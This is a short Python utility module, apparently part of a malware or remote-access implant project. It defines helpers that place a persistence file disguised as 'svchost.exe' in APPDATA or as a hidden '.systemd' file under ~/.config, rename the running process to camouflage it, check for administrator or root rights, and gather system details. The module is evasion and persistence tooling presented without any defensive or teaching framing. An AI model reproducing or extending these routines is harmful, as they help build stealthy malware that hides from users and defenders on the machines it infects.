# core/utils.py

import os
import platform

def get_persistent_path():
    if os.name == "nt":
        return os.path.join(os.getenv('APPDATA'), "svchost.exe")
    else:
        return os.path.expanduser("~/.config/.systemd")

def camufla_nombre_proceso(nombre):
    try:
        import setproctitle
        setproctitle.setproctitle(nombre)
    except ImportError:
        pass

def is_admin():
    if os.name == "nt":
        import ctypes
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    else:
        return os.getuid() == 0

def system_info():
    return f"{platform.system()} {platform.release()} {platform.machine()}"
